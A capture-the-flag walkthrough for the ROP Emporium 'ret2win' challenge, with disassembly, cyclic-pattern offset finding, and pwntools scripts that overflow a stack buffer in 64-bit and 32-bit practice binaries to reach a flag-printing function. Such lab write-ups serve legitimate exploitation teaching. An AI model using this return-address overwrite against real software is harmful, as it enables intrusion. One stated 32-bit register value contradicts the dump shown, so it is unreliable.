---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 1
---

:::note
I will be using pwndbg to solve the 64 bit and the 32 bit. You can use [this](https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8) walkthrough to install both of those plugins. 
:::

## 64 bit
Let's run the executable to check what it does.
```
$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaaaa
Thank you!

Exiting
```
It takes user input and then exits.

We can use the `checksec` utility in order to identify the security properties of the binary executable.
```
$ checksec ret2win
[*] '/home/hacker/ropEmporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
There's two important properties we want to focus on here:
	- `NX enabled`: This means that the stack is not executable. Therefore we cannot use a shellcode injection.
	- `No PIE (0x400000)`: This means that the executable is not positionally independent and it is always loaded at address `0x400000`. So the code and memory regions will have the same address every time we run it. 

Let's open the executable using `gdb-pwndbg` and look at the functions.
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```
The `pwnme` and `ret2win` functions look interesting. We can use the `disassemble` command to see the instructions.

### `pwnme()`
```
pwndbg> disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave
   0x0000000000400755 <+109>:   ret
End of assembler dump.
```
This function seems kind of useless as it isn't accessing the `flag` file.

### `ret2win()`
```
pwndbg> disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
End of assembler dump.
```
If we look at the instruction at `ret2win()+19`, we can see a system call. The instruction at `ret2win()+14` loads the argument for that same system call.
```
pwndbg> x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```
On examining the argument, we can see that it is in executing `/bin/cat` with the `flag` file. Now we know that the `ret2win()` function needs to be called in order to get the flag.

Let's disassemble `main()` to check if the `ret2win()` or `pwnme()` function is being called.

### `main()`
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x400808
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x400820
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400828
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret
End of assembler dump.
```
We can see that the `pwnme()` function is being called but not the `ret2win()` function. Therefore we will have to perform a buffer overflow in order to alter program flow and execute `ret2win()`.

We first have to find the distance between the buffer and the return address.

### Cyclic pattern

We can use a cyclic pattern to find this.
```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Let's run the executable again and provide this cyclic pattern as the input.

We can now look at the registers.
```
───────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*RAX  0xb
 RBX  0x0
*RCX  0x7ffff7ea2a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x1
*RDI  0x7ffff7fa9a70 (_IO_stdfile_1_lock) ◂— 0x0
*RSI  0x1
*R8   0xa
*R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
*R10  0x7ffff7d945e8 ◂— 0xf001200001a64
*R11  0x246
*R12  0x7fffffffe018 —▸ 0x7fffffffe255 ◂— '/home/kunal/ropEmporium/ret2win/ret2win'
*R13  0x400697 (main) ◂— push rbp
 R14  0x0
*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffdef8 ◂— 0x6161616161616166 ('faaaaaaa')
*RIP  0x400755 (pwnme+109) ◂— ret
```
The `rbp` register points to `0x6161616161616165` which is the little endian `eaaaaaaa` in ASCII.

Let's find the offset of this value in our cyclic pattern.
```
pwndbg> cyclic -l 0x6161616161616165
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
```
So the offset is 32 bytes.

Let's see how this looks on the stack.
```
+---------------------------+ 
|  61 61 61 61 61 61 61 61  | <====== buffer (32 bytes) <------ rsp
|  62 61 61 61 61 61 61 61  | 
|  63 61 61 61 61 61 61 61  |
|  64 61 61 61 61 61 61 61  |
+---------------------------+
|  65 61 61 61 61 61 61 61  | <====== stored rbp <------ rbp
+---------------------------+
|  66 61 61 61 61 61 61 61  | <====== return address
+---------------------------+
```
We can see that if we increment the `rbp` by 8, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+8` which is equal to 40.
### Exploit requirements
We have all the information we need to create an exploit.
	- [x] Address of `ret2win`: `0x0000000000400756`
	- [x] Distance between the buffer and return address: `40`

### Exploit

```python title="exploit64.py"
from pwn import *

padding = b"a"*40
ret2win_addr = p64(0x400756)

payload = padding + ret2win_addr

p = process('./ret2win')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit64.py 
[+] Starting local process './ret2win': pid 26803
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag}
```

&nbsp;

## 32 bit

In order to create an exploit we need to know the following:
	
* [ ] Address of `ret2win()`
* [ ] Distance between the buffer and return address

### `ret2win()`

Let's disassemble `ret2win()`.

```
pwndbg> disassemble ret2win
Dump of assembler code for function ret2win:
   0x0804862c <+0>:     push   ebp
   0x0804862d <+1>:     mov    ebp,esp
   0x0804862f <+3>:     sub    esp,0x8
   0x08048632 <+6>:     sub    esp,0xc
   0x08048635 <+9>:     push   0x80487f6
   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
   0x0804863f <+19>:    add    esp,0x10
   0x08048642 <+22>:    sub    esp,0xc
   0x08048645 <+25>:    push   0x8048813
   0x0804864a <+30>:    call   0x80483e0 <system@plt>
   0x0804864f <+35>:    add    esp,0x10
   0x08048652 <+38>:    nop
   0x08048653 <+39>:    leave
   0x08048654 <+40>:    ret
End of assembler dump.
```

So the address of `ret2win()` is `0x0804862c` in the 32-bit executable. One thing to note is that the arguments for a 32-bit function call are pushed on the stack whereas the arguments for a 64-bit function call are stored in registers. 

You can check out live overflow's video if you to know more differences in 64-bit and 32-bit assembly.

### Cyclic pattern

Let's create a cyclic pattern.
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
Let's provide this pattern as the input.
```
───────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*EAX  0xb
*EBX  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
*ECX  0xf7fae9b4 (_IO_stdfile_1_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffffd0f4 —▸ 0xffffd221 ◂— '/home/kunal/ropEmporium/ret2win32/ret2win32'
*EBP  0x6161616b ('kaaa')
*ESP  0xffffd020 ◂— 0x6161616d ('maaa')
*EIP  0x6161616c ('laaa')
```

We can see that the `ebp` has the value `0x41304141` which is the little endian `AA0A` in ASCII.

Let's find the offset of this value in our cyclic pattern.
```
pwndbg> cyclic -l 0x6161616b
Finding cyclic pattern of 4 bytes: b'kaaa' (hex: 0x6b616161)
Found at offset 40
```

So the offset is 40 bytes. 

Let's see how this looks on the stack.

```
<==: Value is stored at that location
<--: Points to the address

+---------------+ 
|  61 61 61 61  | <== buffer (32 bytes) <-- esp
|  62 61 61 61  | 
|  63 61 61 61  |
|  64 61 61 61  |
|  65 61 61 61  |
|  66 61 61 61  |
|  67 61 61 61  |
|  68 61 61 61  |
|  69 61 61 61  |
|  6A 61 61 61  |
+---------------+
|  6B 61 61 61  | <== stored ebp <-- ebp
+---------------+
|  6C 61 61 61  | <== return address
+---------------+
```

We can see that if we increment the `ebp` by 4, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+4` which is equal to 44.

### Exploit requirements

We have all the information we need to create an exploit.
	- [x] Address of `ret2win()`: `0x0804862c`
	- [x] Distance between the buffer and return address: `44`

### Exploit

```python title="exploit32.py"
from pwn import *

padding = b"a"*44
ret2win_addr = p32(0x0804862c)

payload = padding + ret2win_addr

p = process('./ret2win32')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit32.py
[x] Starting local process './ret2win32'
[+] Starting local process './ret2win32': pid 35136
[*] Switching to interactive mode
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```
